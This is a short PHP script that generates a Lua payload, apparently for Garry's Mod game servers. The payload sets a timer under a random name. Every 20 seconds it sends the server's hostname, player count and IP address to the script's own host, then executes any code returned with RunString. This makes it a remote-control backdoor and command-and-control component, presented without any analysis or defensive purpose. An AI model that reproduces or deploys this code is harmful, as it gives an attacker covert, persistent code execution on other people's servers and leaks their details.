<?php
// Génére une chaine de charactére
function reloadString($length = 100) {
    $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZs';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
//20 = timer
include('kerminidrmv2.php');
$url = "http://".$_SERVER["HTTP_HOST"].str_replace("1.php", "2.php", $_SERVER["REQUEST_URI"]);
echo '
timer.Create( "'.reloadString(10).'", 20, 0, function()
local a = {
n = string.Replace( GetHostName(), " ", "_" ),
nb = tostring(#player.GetAll()),
i = game.GetIPAddress()
}
http.Post( "'.$url.'", a,
function( body, len, headers, code )
RunString(body)
end)
end)
';
?>